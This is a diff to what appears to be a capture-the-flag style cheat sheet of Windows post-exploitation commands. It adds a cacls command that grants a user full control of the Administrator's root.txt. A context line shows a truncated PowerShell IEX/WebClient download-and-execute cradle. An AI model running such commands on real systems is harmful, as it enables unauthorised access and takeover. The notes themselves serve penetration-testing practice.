@@ -185,7 +185,7 @@ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient
 whoami /priv
 ```
 
-## View Permisions
+### View Permisions
 
 ```
 cacls C:\Users\Administrator\Desktop\root.txt
@@ -195,6 +195,14 @@ cacls C:\Users\Administrator\Desktop\root.txt
 
 ```
 cacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:F
+```
+```
+cacls "c:\users\Administrator\Desktop\root.txt" /E /P Alfred:F
+
+cacls Windows utility to view/edit file permissions
+/E to edit ACL
+/P to set permissions
+Alfred:F to give Alfred full control of the file
 ```
 
 ## SSH from Windows to Attacker (Kali)
